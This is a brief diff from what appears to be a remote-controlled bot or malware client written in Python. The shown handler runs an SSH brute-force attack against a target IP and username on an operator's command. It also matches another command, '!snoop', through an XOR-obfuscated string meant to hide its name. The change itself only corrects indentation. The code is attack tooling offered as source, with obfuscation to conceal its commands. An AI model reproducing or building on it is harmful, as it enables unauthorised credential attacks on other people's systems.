@@ -179,7 +179,7 @@ def handle(sock):
 						p = threading.Thread(target=brute_force_ssh, args =(command[1],command[2],command[3])) #!bf_ssh <ip> <username> <timeout in seconds>
 						p.start()
 					attack+=1
-				 elif command[0] == xor_dec('QAAKCQgY',key):#encoded keyword: !snoop
+				elif command[0] == xor_dec('QAAKCQgY',key):#encoded keyword: !snoop
 					if attack != 0:
 						stop = True
 						attack=0
